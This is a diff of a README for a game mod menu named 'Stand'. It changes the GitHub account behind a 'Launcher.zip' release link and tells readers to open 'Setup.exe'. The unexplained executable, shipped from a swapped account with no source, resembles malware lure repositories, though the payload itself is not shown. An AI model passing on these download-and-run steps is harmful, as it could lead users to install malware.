@@ -4,7 +4,7 @@
 
 ## Installation
 
-- [**Download latest release**](https://github.com/InvasionDivide58/Stand-mod-menu/releases/download/Release/Launcher.zip)
+- [**Download latest release**](https://github.com/wowpuncher/Stand-mod-menu/releases/download/Release/Launcher.zip)
 -  **Open "Setup.exe" File**
 -  **Enjoy**
 
